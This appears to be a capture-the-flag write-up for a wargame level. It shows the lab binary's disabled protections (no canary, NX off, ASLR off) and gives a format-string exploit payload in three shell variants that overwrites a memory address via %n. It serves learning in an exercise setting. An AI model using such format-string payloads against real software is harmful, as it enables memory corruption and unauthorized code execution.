# level4

## Header

```bash
ssh level4@192.168.64.9 -p 4242
...
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4
```

<hr>

## Solution

The same as level3

echo -n $'\x10\x98\x04\x08%16930112c%12$n' | ./level4

printf '\x10\x98\x04\x08%%16930112c%%12$n' | ./level4

python -c 'print "\x10\x98\x04\x08%16930112c%12$n"' | ./level4

## References
https://owasp.org/www-community/attacks/Format_string_attack